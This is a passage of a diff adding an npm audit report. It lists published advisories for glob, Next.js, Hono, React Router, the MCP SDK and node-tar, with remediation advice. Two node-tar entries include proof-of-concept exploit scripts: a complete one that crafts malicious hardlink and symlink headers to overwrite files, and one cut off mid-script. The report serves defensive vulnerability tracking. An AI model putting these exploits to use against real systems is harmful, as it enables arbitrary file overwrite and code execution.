files\n- Wide distribution of compromise through package ecosystems\n\n**Platform-Specific Risks:**\n- **POSIX/Linux/macOS:** High risk due to flexible filename characters and shell parsing\n- **Windows:** Lower risk due to filename restrictions, but vulnerability persists with PowerShell, Git Bash, WSL\n- **Mixed Environments:** CI systems often use Linux containers regardless of developer platform\n\n### Affected Products\n\n- **Ecosystem:** npm\n- **Package name:** glob\n- **Component:** CLI only (`src/bin.mts`)\n- **Affected versions:** v10.2.0 through v11.0.3 (and likely later versions until patched)\n- **Introduced:** v10.2.0 (first release with CLI containing `-c/--cmd` option)\n- **Patched versions:** 11.1.0and 10.5.0\n\n**Scope Limitation:**\n- **Library API Not Affected:** Core glob functions (`glob()`, `globSync()`, async iterators) are safe\n- **CLI-Specific:** Only the command-line interface with `-c/--cmd` option is vulnerable\n\n### Remediation\n\n- Upgrade to `glob@10.5.0`, `glob@11.1.0`, or higher, as soon as possible.\n- If any `glob` CLI actions fail, then convert commands containing positional arguments, to use the `--cmd-arg`/`-g` option instead.\n- As a last resort, use `--shell` to maintain `shell:true` behavior until glob v12, but take care to ensure that no untrusted contents can possibly be encountered in the file path results.",
+      "reported_by": null,
+      "title": "glob CLI: Command injection via -c/--cmd executes matches with shell:true",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-64756"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "glob",
+      "vulnerable_versions": ">=10.2.0 <10.5.0",
+      "github_advisory_id": "GHSA-5j98-mcp5-4vw2",
+      "recommendation": "Upgrade to version 10.5.0 or later",
+      "patched_versions": ">=10.5.0",
+      "updated": "2025-11-19T02:30:53.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H"
+      },
+      "cwe": [
+        "CWE-78"
+      ],
+      "url": "https://github.com/advisories/GHSA-5j98-mcp5-4vw2"
+    },
+    "1111095": {
+      "findings": [
+        {
+          "version": "3.4.33",
+          "paths": [
+            "web__ai-control-plane>ai"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2025-48985\n- https://github.com/vercel/ai/commit/930399bb9839a8baf3d349614106d78268775eed\n- https://vercel.com/changelog/cve-2025-48985-input-validation-bypass-on-ai-sdk\n- https://github.com/vercel/ai/issues/8881\n- https://github.com/advisories/GHSA-rwvc-j5jr-mgvh",
+      "created": "2025-11-07T03:30:25.000Z",
+      "id": 1111095,
+      "npm_advisory_id": null,
+      "overview": "A vulnerability in Vercel’s AI SDK has been fixed in versions 5.0.52, 5.1.0-beta.9, and 6.0.0-beta. This issue may have allowed users to bypass filetype whitelists when uploading files. All users are encouraged to upgrade.",
+      "reported_by": null,
+      "title": "Vercel’s AI SDK's filetype whitelists can be bypassed when uploading files",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-48985"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "ai",
+      "vulnerable_versions": "<5.0.52",
+      "github_advisory_id": "GHSA-rwvc-j5jr-mgvh",
+      "recommendation": "Upgrade to version 5.0.52 or later",
+      "patched_versions": ">=5.0.52",
+      "updated": "2025-12-02T01:27:16.000Z",
+      "cvss": {
+        "score": 3.7,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-20",
+        "CWE-682"
+      ],
+      "url": "https://github.com/advisories/GHSA-rwvc-j5jr-mgvh"
+    },
+    "1111391": {
+      "findings": [
+        {
+          "version": "14.0.4",
+          "paths": [
+            "web__billing-site>next"
+          ]
+        },
+        {
+          "version": "14.2.3",
+          "paths": [
+            "web__web-backup-subscription-starter>next"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vercel/next.js/security/advisories/GHSA-mwv6-3258-q52c\n- https://nextjs.org/blog/security-update-2025-12-11\n- https://www.cve.org/CVERecord?id=CVE-2025-55184\n- https://github.com/advisories/GHSA-mwv6-3258-q52c",
+      "created": "2025-12-11T22:49:27.000Z",
+      "id": 1111391,
+      "npm_advisory_id": null,
+      "overview": "A vulnerability affects certain React packages for versions 19.0.0, 19.0.1, 19.1.0, 19.1.1, 19.1.2, 19.2.0, and 19.2.1 and frameworks that use the affected packages, including Next.js 15.x and 16.x using the App Router. The issue is tracked upstream as [CVE-2025-55184](https://www.cve.org/CVERecord?id=CVE-2025-55184).\n\nA malicious HTTP request can be crafted and sent to any App Router endpoint that, when deserialized, can cause the server process to hang and consume CPU. This can result in denial of service in unpatched environments.",
+      "reported_by": null,
+      "title": "Next Vulnerable to Denial of Service with Server Components",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "high",
+      "module_name": "next",
+      "vulnerable_versions": ">=13.3.0 <14.2.34",
+      "github_advisory_id": "GHSA-mwv6-3258-q52c",
+      "recommendation": "Upgrade to version 14.2.34 or later",
+      "patched_versions": ">=14.2.34",
+      "updated": "2025-12-11T22:49:30.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-502",
+        "CWE-1395"
+      ],
+      "url": "https://github.com/advisories/GHSA-mwv6-3258-q52c"
+    },
+    "1111906": {
+      "findings": [
+        {
+          "version": "1.25.1",
+          "paths": [
+            "web__chatgpt_ipai_ai_studio>@modelcontextprotocol/sdk"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2026-0621\n- https://github.com/modelcontextprotocol/typescript-sdk/issues/965\n- https://www.vulncheck.com/advisories/mcp-typescript-sdk-uritemplate-exploded-array-pattern-redos\n- https://github.com/modelcontextprotocol/typescript-sdk/security/advisories/GHSA-cqwc-fm46-7fff\n- https://github.com/modelcontextprotocol/typescript-sdk/commit/b392f02ffcf37c088dbd114fedf25026ec3913d3\n- https://github.com/modelcontextprotocol/typescript-sdk/releases/tag/v1.25.2\n- https://github.com/advisories/GHSA-8r9q-7v3j-jr4g",
+      "created": "2026-01-05T21:30:33.000Z",
+      "id": 1111906,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nA ReDoS vulnerability in the `UriTemplate` class allows attackers to cause denial of service. The `partToRegExp()` function generates a regex pattern with nested quantifiers (`([^/]+(?:,[^/]+)*)`) for exploded template variables (e.g., `{/id*}`, `{?tags*}`), causing catastrophic backtracking on malicious input.\n\n**Who is affected:** MCP servers that register resource templates with exploded array patterns and accept requests from untrusted clients.\n\n**Attack result:** An attacker sends a crafted URI via `resources/read` request, causing 100% CPU utilization, server hang/crash, and denial of service for all clients.\n\n### Affected Versions\n\nAll versions of `@modelcontextprotocol/sdk` prior to the patched release.\n\n### Patches\n\nv1.25.2 contains b392f02ffcf37c088dbd114fedf25026ec3913d3 the fix modifies the regex pattern to prevent backtracking.\n\n### Workarounds\n\n- Avoid using exploded patterns (`{/id*}`, `{?tags*}`) in resource templates\n- Implement request timeouts and rate limiting\n- Validate URIs before processing to reject suspicious patterns",
+      "reported_by": null,
+      "title": "Anthropic's MCP TypeScript SDK has a ReDoS vulnerability",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-0621"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "@modelcontextprotocol/sdk",
+      "vulnerable_versions": "<1.25.2",
+      "github_advisory_id": "GHSA-8r9q-7v3j-jr4g",
+      "recommendation": "Upgrade to version 1.25.2 or later",
+      "patched_versions": ">=1.25.2",
+      "updated": "2026-01-07T16:16:29.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-1333"
+      ],
+      "url": "https://github.com/advisories/GHSA-8r9q-7v3j-jr4g"
+    },
+    "1112050": {
+      "findings": [
+        {
+          "version": "1.19.3",
+          "paths": [
+            "web__mobile>expo-router>@expo/server>@remix-run/node>@remix-run/server-runtime"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/remix-run/react-router/security/advisories/GHSA-h5cw-625j-3rxh\n- https://nvd.nist.gov/vuln/detail/CVE-2026-22030\n- https://github.com/advisories/GHSA-h5cw-625j-3rxh",
+      "created": "2026-01-08T20:57:09.000Z",
+      "id": 1112050,
+      "npm_advisory_id": null,
+      "overview": "React Router (or Remix v2) is vulnerable to CSRF attacks on document POST requests to UI routes when using server-side route `action` handlers in [Framework Mode](https://reactrouter.com/start/modes#framework), or when using React Server Actions in the new unstable RSC modes.\n\n> [!NOTE]\n> This does not impact applications that use [Declarative Mode](https://reactrouter.com/start/modes#declarative) (`<BrowserRouter>`) or [Data Mode](https://reactrouter.com/start/modes#data) (`createBrowserRouter`/`<RouterProvider>`).",
+      "reported_by": null,
+      "title": "React Router has CSRF issue in Action/Server Action Request Processing",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-22030"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "@remix-run/server-runtime",
+      "vulnerable_versions": "<=2.17.2",
+      "github_advisory_id": "GHSA-h5cw-625j-3rxh",
+      "recommendation": "Upgrade to version 2.17.3 or later",
+      "patched_versions": ">=2.17.3",
+      "updated": "2026-01-11T14:54:20.000Z",
+      "cvss": {
+        "score": 6.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N"
+      },
+      "cwe": [
+        "CWE-346",
+        "CWE-352"
+      ],
+      "url": "https://github.com/advisories/GHSA-h5cw-625j-3rxh"
+    },
+    "1112052": {
+      "findings": [
+        {
+          "version": "1.7.2",
+          "paths": [
+            "web__mobile>expo-router>@expo/server>@remix-run/node>@remix-run/server-runtime>@remix-run/router"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/remix-run/react-router/security/advisories/GHSA-2w69-qvjg-hvjx\n- https://nvd.nist.gov/vuln/detail/CVE-2026-22029\n- https://github.com/advisories/GHSA-2w69-qvjg-hvjx",
+      "created": "2026-01-08T20:54:18.000Z",
+      "id": 1112052,
+      "npm_advisory_id": null,
+      "overview": "React Router (and Remix v1/v2) SPA open navigation redirects originating from loaders or actions in [Framework Mode](https://reactrouter.com/start/modes#framework), [Data Mode](https://reactrouter.com/start/modes#data), or the unstable RSC modes can result in unsafe URLs causing unintended javascript execution on the client. This is only an issue if developers are creating redirect paths from untrusted content or via an open redirect.\n\n> [!NOTE]\n> This does not impact applications that use [Declarative Mode](https://reactrouter.com/start/modes#declarative) (`<BrowserRouter>`).",
+      "reported_by": null,
+      "title": "React Router vulnerable to XSS via Open Redirects",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-22029"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "@remix-run/router",
+      "vulnerable_versions": "<=1.23.1",
+      "github_advisory_id": "GHSA-2w69-qvjg-hvjx",
+      "recommendation": "Upgrade to version 1.23.2 or later",
+      "patched_versions": ">=1.23.2",
+      "updated": "2026-01-11T14:54:15.000Z",
+      "cvss": {
+        "score": 8,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:N"
+      },
+      "cwe": [
+        "CWE-79"
+      ],
+      "url": "https://github.com/advisories/GHSA-2w69-qvjg-hvjx"
+    },
+    "1112059": {
+      "findings": [
+        {
+          "version": "1.19.3",
+          "paths": [
+            "web__mobile>expo-router>@expo/server>@remix-run/node"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/remix-run/react-router/security/advisories/GHSA-9583-h5hc-x8cw\n- https://nvd.nist.gov/vuln/detail/CVE-2025-61686\n- https://github.com/advisories/GHSA-9583-h5hc-x8cw",
+      "created": "2026-01-08T20:45:07.000Z",
+      "id": 1112059,
+      "npm_advisory_id": null,
+      "overview": "If applications use `createFileSessionStorage()` from `@react-router/node` (or `@remix-run/node`/`@remix-run/deno` in Remix v2) with an [**unsigned cookie**](https://reactrouter.com/explanation/sessions-and-cookies#signing-cookies), it is possible for an attacker to cause the session to try to read/write from a location outside the specified session file directory. The success of the attack would depend on the permissions of the web server process to access those files. \n\nRead files cannot be returned directly to the attacker.  Session file reads would only succeed if the file matched the expected session file format. If the file matched the session file format, the data would be populated into the server side session but not directly returned to the attacker unless the application logic returned specific session information.",
+      "reported_by": null,
+      "title": "React Router has Path Traversal in File Session Storage",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-61686"
+      ],
+      "access": "public",
+      "severity": "critical",
+      "module_name": "@remix-run/node",
+      "vulnerable_versions": "<=2.17.1",
+      "github_advisory_id": "GHSA-9583-h5hc-x8cw",
+      "recommendation": "Upgrade to version 2.17.2 or later",
+      "patched_versions": ">=2.17.2",
+      "updated": "2026-01-11T14:53:55.000Z",
+      "cvss": {
+        "score": 9.1,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H"
+      },
+      "cwe": [
+        "CWE-22"
+      ],
+      "url": "https://github.com/advisories/GHSA-9583-h5hc-x8cw"
+    },
+    "1112134": {
+      "findings": [
+        {
+          "version": "4.11.3",
+          "paths": [
+            "web__chatgpt_ipai_ai_studio>@modelcontextprotocol/sdk>@hono/node-server>hono"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/honojs/hono/security/advisories/GHSA-3vhc-576x-3qv4\n- https://nvd.nist.gov/vuln/detail/CVE-2026-22818\n- https://github.com/honojs/hono/commit/190f6e28e2ca85ce3d1f2f54db1310f5f3eab134\n- https://github.com/advisories/GHSA-3vhc-576x-3qv4",
+      "created": "2026-01-13T21:52:03.000Z",
+      "id": 1112134,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nA flaw in Hono’s JWK/JWKS JWT verification middleware allowed the algorithm specified in the JWT header to influence signature verification when the selected JWK did not explicitly define an algorithm. This could enable JWT algorithm confusion and, in certain configurations, allow forged tokens to be accepted.\n\n## Details\n\nWhen verifying JWTs using JWKs or a JWKS endpoint, the middleware selected the verification algorithm based on the JWK’s `alg` field if present. If the JWK did not specify an algorithm, the middleware fell back to using the `alg` value provided in the unverified JWT header.\n\nBecause the `alg` field in a JWK is optional and commonly omitted in real-world JWKS configurations, this behavior could allow an attacker to influence which algorithm is used for verification. In some environments, this may result in authentication or authorization bypass through crafted JWTs.\n\nThe practical impact depends on application configuration, including which algorithms are accepted and how JWTs are used to make authorization decisions.\n\n## Impact\n\nIn affected configurations, an attacker may be able to forge JWTs with attacker-controlled claims, potentially leading to authentication or authorization bypass.\n\nApplications that do not use the JWK/JWKS middleware, do not rely on JWT-based authentication, or explicitly restrict allowed algorithms are not affected.\n\n## Resolution\n\nUpdate to the latest patched release.\n\n**Breaking change:**\n\nThe JWK/JWKS JWT verification middleware has been updated to require an explicit allowlist of asymmetric algorithms when verifying tokens. The middleware no longer derives the verification algorithm from untrusted JWT header values.\n\nInstead, callers must explicitly specify which asymmetric algorithms are permitted, and only tokens signed with those algorithms will be accepted. This prevents JWT algorithm confusion by ensuring that algorithm selection is fully controlled by application\nconfiguration.\n\nAs part of this fix, the `alg` option is now required when using the JWK/JWKS middleware, and symmetric (HS*) algorithms are no longer accepted in this context.\n\n### Before (vulnerable configuration)\n\n```ts\nimport { jwk } from 'hono/jwk'\n\napp.use(\n  '/auth/*',\n  jwk({\n    jwks_uri: 'https://example.com/.well-known/jwks.json',\n    // alg was optional\n  })\n)\n```\n\n### After (patched configuration)\n\n```ts\nimport { jwk } from 'hono/jwk'\n\napp.use(\n  '/auth/*',\n  jwk({\n    jwks_uri: 'https://example.com/.well-known/jwks.json',\n    alg: ['RS256'], // required: explicit asymmetric algorithm allowlist\n  })\n)\n```",
+      "reported_by": null,
+      "title": "Hono JWK Auth Middleware has JWT algorithm confusion when JWK lacks \"alg\" (untrusted header.alg fallback)",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-22818"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "hono",
+      "vulnerable_versions": "<4.11.4",
+      "github_advisory_id": "GHSA-3vhc-576x-3qv4",
+      "recommendation": "Upgrade to version 4.11.4 or later",
+      "patched_versions": ">=4.11.4",
+      "updated": "2026-01-13T21:52:05.000Z",
+      "cvss": {
+        "score": 8.2,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:N"
+      },
+      "cwe": [
+        "CWE-347"
+      ],
+      "url": "https://github.com/advisories/GHSA-3vhc-576x-3qv4"
+    },
+    "1112135": {
+      "findings": [
+        {
+          "version": "4.11.3",
+          "paths": [
+            "web__chatgpt_ipai_ai_studio>@modelcontextprotocol/sdk>@hono/node-server>hono"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/honojs/hono/security/advisories/GHSA-f67f-6cw9-8mq4\n- https://nvd.nist.gov/vuln/detail/CVE-2026-22817\n- https://github.com/honojs/hono/commit/cc0aa7ae327ed84cc391d29086dec2a3e44e7a1f\n- https://github.com/advisories/GHSA-f67f-6cw9-8mq4",
+      "created": "2026-01-13T21:51:44.000Z",
+      "id": 1112135,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nA flaw in Hono’s JWK/JWKS JWT verification middleware allowed the JWT header’s `alg` value to influence signature verification when the selected JWK did not explicitly specify an algorithm. This could enable **JWT algorithm confusion** and, in certain configurations, allow forged tokens to be accepted.\n\n## Details\n\nWhen verifying JWTs using JWKs or a JWKS endpoint, the middleware selected the verification algorithm based on the JWK’s `alg` field if present, but otherwise fell back to the `alg` value provided in the unverified JWT header.\n\nBecause the `alg` field in a JWK is optional and often omitted in real-world JWKS configurations, this behavior could allow an attacker to control the algorithm used for verification. In some environments, this may lead to authentication or authorization\nbypass through crafted tokens.\n\nThe practical impact depends on application configuration, including which algorithms are accepted and how JWTs are used for authorization decisions.\n\n## Impact\n\nIn affected configurations, an attacker may be able to forge JWTs with attacker-controlled claims, potentially resulting in authentication or authorization bypass.\n\nApplications that do not use the JWK/JWKS middleware, do not rely on JWT-based authentication, or explicitly restrict allowed algorithms are not affected.\n\n## Resolution\n\nUpdate to the latest patched release.\n\n**Breaking change:**\n\nAs part of this fix, the JWT middleware now requires the `alg` option to be explicitly specified. This prevents algorithm confusion by ensuring that the verification algorithm is not derived from untrusted JWT header values.\n\nApplications upgrading must update their configuration accordingly.\n\n### Before (vulnerable configuration)\n\n```ts\nimport { jwt } from 'hono/jwt'\n\napp.use(\n  '/auth/*',\n  jwt({\n    secret: 'it-is-very-secret',\n    // alg was optional\n  })\n)\n```\n\n### After (patched configuration)\n\n```ts\nimport { jwt } from 'hono/jwt'\n\napp.use(\n  '/auth/*',\n  jwt({\n    secret: 'it-is-very-secret',\n    alg: 'HS256', // required\n  })\n)\n```",
+      "reported_by": null,
+      "title": "Hono JWT Middleware's JWT Algorithm Confusion via Unsafe Default (HS256) Allows Token Forgery and Auth Bypass",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-22817"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "hono",
+      "vulnerable_versions": "<4.11.4",
+      "github_advisory_id": "GHSA-f67f-6cw9-8mq4",
+      "recommendation": "Upgrade to version 4.11.4 or later",
+      "patched_versions": ">=4.11.4",
+      "updated": "2026-01-13T21:51:46.000Z",
+      "cvss": {
+        "score": 8.2,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:N"
+      },
+      "cwe": [
+        "CWE-347"
+      ],
+      "url": "https://github.com/advisories/GHSA-f67f-6cw9-8mq4"
+    },
+    "1112182": {
+      "findings": [
+        {
+          "version": "14.0.4",
+          "paths": [
+            "web__billing-site>next"
+          ]
+        },
+        {
+          "version": "14.2.3",
+          "paths": [
+            "web__web-backup-subscription-starter>next"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vercel/next.js/security/advisories/GHSA-5j59-xgg2-r9c4\n- https://nvd.nist.gov/vuln/detail/CVE-2025-67779\n- https://nextjs.org/blog/security-update-2025-12-11\n- https://react.dev/blog/2025/12/11/denial-of-service-and-source-code-exposure-in-react-server-components\n- https://www.cve.org/CVERecord?id=CVE-2025-55184\n- https://www.facebook.com/security/advisories/cve-2025-67779\n- https://github.com/advisories/GHSA-5j59-xgg2-r9c4",
+      "created": "2025-12-12T17:21:57.000Z",
+      "id": 1112182,
+      "npm_advisory_id": null,
+      "overview": "It was discovered that the fix for [CVE-2025-55184](https://github.com/advisories/GHSA-2m3v-v2m8-q956) in React Server Components was incomplete and did not fully mitigate denial-of-service conditions across all payload types.  As a result, certain crafted inputs could still trigger excessive resource consumption. \n\nThis vulnerability affects React versions 19.0.2, 19.1.3, and 19.2.2, as well as frameworks that bundle or depend on these versions, including Next.js 13.x, 14.x, 15.x, and 16.x when using the App Router. The issue is tracked upstream as [CVE-2025-67779](https://www.cve.org/CVERecord?id=CVE-2025-67779).\n\nA malicious actor can send a specially crafted HTTP request to a Server Function endpoint that, when deserialized, causes the React Server Components runtime to enter an infinite loop. This can lead to sustained CPU consumption and cause the affected server process to become unresponsive, resulting in a denial-of-service condition in unpatched environments.",
+      "reported_by": null,
+      "title": "Next has a Denial of Service with Server Components - Incomplete Fix Follow-Up",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "high",
+      "module_name": "next",
+      "vulnerable_versions": ">=13.3.1-canary.0 <14.2.35",
+      "github_advisory_id": "GHSA-5j59-xgg2-r9c4",
+      "recommendation": "Upgrade to version 14.2.35 or later",
+      "patched_versions": ">=14.2.35",
+      "updated": "2026-01-15T21:55:06.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-502",
+        "CWE-1395"
+      ],
+      "url": "https://github.com/advisories/GHSA-5j59-xgg2-r9c4"
+    },
+    "1112255": {
+      "findings": [
+        {
+          "version": "6.2.1",
+          "paths": [
+            "web__mobile>expo>@expo/cli>tar"
+          ]
+        },
+        {
+          "version": "7.4.3",
+          "paths": [
+            "web__platform-kit>supabase>tar"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/isaacs/node-tar/security/advisories/GHSA-8qq5-rm4j-mr97\n- https://github.com/isaacs/node-tar/commit/340eb285b6d986e91969a1170d7fe9b0face405e\n- https://github.com/advisories/GHSA-8qq5-rm4j-mr97",
+      "created": "2026-01-16T21:16:20.000Z",
+      "id": 1112255,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nThe `node-tar` library (`<= 7.5.2`) fails to sanitize the `linkpath` of `Link` (hardlink) and `SymbolicLink` entries when `preservePaths` is false (the default secure behavior). This allows malicious archives to bypass the extraction root restriction, leading to **Arbitrary File Overwrite** via hardlinks and **Symlink Poisoning** via absolute symlink targets.\n\n### Details\n\nThe vulnerability exists in `src/unpack.ts` within the `[HARDLINK]` and `[SYMLINK]` methods.\n\n**1. Hardlink Escape (Arbitrary File Overwrite)**\n\nThe extraction logic uses `path.resolve(this.cwd, entry.linkpath)` to determine the hardlink target. Standard Node.js behavior dictates that if the second argument (`entry.linkpath`) is an **absolute path**, `path.resolve` ignores the first argument (`this.cwd`) entirely and returns the absolute path.\n\nThe library fails to validate that this resolved target remains within the extraction root. A malicious archive can create a hardlink to a sensitive file on the host (e.g., `/etc/passwd`) and subsequently write to it, if file permissions allow writing to the target file, bypassing path-based security measures that may be in place.\n\n**2. Symlink Poisoning**\n\nThe extraction logic passes the user-supplied `entry.linkpath` directly to `fs.symlink` without validation. This allows the creation of symbolic links pointing to sensitive absolute system paths or traversing paths (`../../`), even when secure extraction defaults are used.\n\n### PoC\n\nThe following script generates a binary TAR archive containing malicious headers (a hardlink to a local file and a symlink to `/etc/passwd`). It then extracts the archive using standard `node-tar` settings and demonstrates the vulnerability by verifying that the local \"secret\" file was successfully overwritten.\n\n```javascript\nconst fs = require('fs')\nconst path = require('path')\nconst tar = require('tar')\n\nconst out = path.resolve('out_repro')\nconst secret = path.resolve('secret.txt')\nconst tarFile = path.resolve('exploit.tar')\nconst targetSym = '/etc/passwd'\n\n// Cleanup & Setup\ntry { fs.rmSync(out, {recursive:true, force:true}); fs.unlinkSync(secret) } catch {}\nfs.mkdirSync(out)\nfs.writeFileSync(secret, 'ORIGINAL_DATA')\n\n// 1. Craft malicious Link header (Hardlink to absolute local file)\nconst h1 = new tar.Header({\n  path: 'exploit_hard',\n  type: 'Link',\n  size: 0,\n  linkpath: secret \n})\nh1.encode()\n\n// 2. Craft malicious Symlink header (Symlink to /etc/passwd)\nconst h2 = new tar.Header({\n  path: 'exploit_sym',\n  type: 'SymbolicLink',\n  size: 0,\n  linkpath: targetSym \n})\nh2.encode()\n\n// Write binary tar\nfs.writeFileSync(tarFile, Buffer.concat([ h1.block, h2.block, Buffer.alloc(1024) ]))\n\nconsole.log('[*] Extracting malicious tarball...')\n\n// 3. Extract with default secure settings\ntar.x({\n  cwd: out,\n  file: tarFile,\n  preservePaths: false\n}).then(() => {\n  console.log('[*] Verifying payload...')\n\n  // Test Hardlink Overwrite\n  try {\n    fs.writeFileSync(path.join(out, 'exploit_hard'), 'OVERWRITTEN')\n    \n    if (fs.readFileSync(secret, 'utf8') === 'OVERWRITTEN') {\n      console.log('[+] VULN CONFIRMED: Hardlink overwrite successful')\n    } else {\n      console.log('[-] Hardlink failed')\n    }\n  } catch (e) {}\n\n  // Test Symlink Poisoning\n  try {\n    if (fs.readlinkSync(path.join(out, 'exploit_sym')) === targetSym) {\n      console.log('[+] VULN CONFIRMED: Symlink points to absolute path')\n    } else {\n      console.log('[-] Symlink failed')\n    }\n  } catch (e) {}\n})\n\n```\n\n### Impact\n\n* **Arbitrary File Overwrite:** An attacker can overwrite any file the extraction process has access to, bypassing path-based security restrictions. It does not grant write access to files that the extraction process does not otherwise have access to, such as root-owned configuration files.\n* **Remote Code Execution (RCE):** In CI/CD environments or automated pipelines, overwriting configuration files, scripts, or binaries leads to code execution. (However, npm is unaffected, as it filters out all `Link` and `SymbolicLink` tar entries from extracted packages.)",
+      "reported_by": null,
+      "title": "node-tar is Vulnerable to Arbitrary File Overwrite and Symlink Poisoning via Insufficient Path Sanitization",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-23745"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "tar",
+      "vulnerable_versions": "<=7.5.2",
+      "github_advisory_id": "GHSA-8qq5-rm4j-mr97",
+      "recommendation": "Upgrade to version 7.5.3 or later",
+      "patched_versions": ">=7.5.3",
+      "updated": "2026-01-16T21:16:24.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-22"
+      ],
+      "url": "https://github.com/advisories/GHSA-8qq5-rm4j-mr97"
+    },
+    "1112329": {
+      "findings": [
+        {
+          "version": "6.2.1",
+          "paths": [
+            "web__mobile>expo>@expo/cli>tar"
+          ]
+        },
+        {
+          "version": "7.4.3",
+          "paths": [
+            "web__platform-kit>supabase>tar"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/isaacs/node-tar/security/advisories/GHSA-r6q2-hw4h-h46w\n- https://nvd.nist.gov/vuln/detail/CVE-2026-23950\n- https://github.com/isaacs/node-tar/commit/3b1abfae650056edfabcbe0a0df5954d390521e6\n- https://github.com/advisories/GHSA-r6q2-hw4h-h46w",
+      "created": "2026-01-21T01:05:49.000Z",
+      "id": 1112329,
+      "npm_advisory_id": null,
+      "overview": "**TITLE**: Race Condition in node-tar Path Reservations via Unicode Sharp-S (ß) Collisions on macOS APFS\n\n**AUTHOR**: Tomás Illuminati\n\n### Details\n\nA race condition vulnerability exists in `node-tar` (v7.5.3) this is to an incomplete handling of Unicode path collisions in the `path-reservations` system. On case-insensitive or normalization-insensitive filesystems (such as macOS APFS, In which it has been tested), the library fails to lock colliding paths (e.g., `ß` and `ss`), allowing them to be processed in parallel. This bypasses the library's internal concurrency safeguards and permits Symlink Poisoning attacks via race conditions. The library uses a `PathReservations` system to ensure that metadata checks and file operations for the same path are serialized. This prevents race conditions where one entry might clobber another concurrently.\n\n```typescript\n// node-tar/src/path-reservations.ts (Lines 53-62)\nreserve(paths: string[], fn: Handler) {\n    paths =\n      isWindows ?\n        ['win32 parallelization disabled']\n      : paths.map(p => {\n          return stripTrailingSlashes(\n            join(normalizeUnicode(p)), // <- THE PROBLEM FOR MacOS FS\n          ).toLowerCase()\n        })\n\n```\n\nIn MacOS the ```join(normalizeUnicode(p)), ``` FS confuses ß with ss, but this code does not. For example:\n\n``````bash\nbash-3.2$ printf \"CONTENT_SS\\n\" > collision_test_ss\nbash-3.2$ ls\ncollision_test_ss\nbash-3.2$ printf \"CONTENT_ESSZETT\\n\" > collision_test_ß\nbash-3.2$ ls -la\ntotal 8\ndrwxr-xr-x   3 testuser  staff    96 Jan 19 01:25 .\ndrwxr-x---+ 82 testuser  staff  2624 Jan 19 01:25 ..\n-rw-r--r--   1 testuser  staff    16 Jan 19 01:26 collision_test_ss\nbash-3.2$ \n``````\n\n---\n\n### PoC\n\n``````javascript\nconst tar = require('tar');\nconst fs = require('fs');\nconst path = require('path');\nconst { PassThrough } = require('stream');\n\nconst exploitDir = path.resolve('race_exploit_dir');\nif (fs.existsSync(exploitDir)) fs.rmSync(exploitDir, { recursive: true, force: true });\nfs.mkdirSync(exploitDir);\n\nconsole.log('[*] Testing...');\nconsole.log(`[*] Extraction target: ${exploitDir}`);\n\n// Construct stream\nconst stream = new PassThrough();\n\nconst 